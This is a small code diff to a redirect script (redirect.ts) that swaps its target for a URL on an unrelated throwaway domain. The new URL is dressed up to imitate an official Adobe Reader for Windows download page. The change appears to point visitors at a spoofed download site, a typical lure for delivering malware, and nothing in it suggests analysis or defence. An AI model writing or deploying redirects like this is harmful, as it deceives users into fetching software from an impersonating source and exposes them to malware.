@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://netvigatol.com/choiceone/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://get.adobe.jaaaaaaaas002.me/reader-download-os-Windows-10-name-Reader-2025-001-20997-English-for-Windows"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
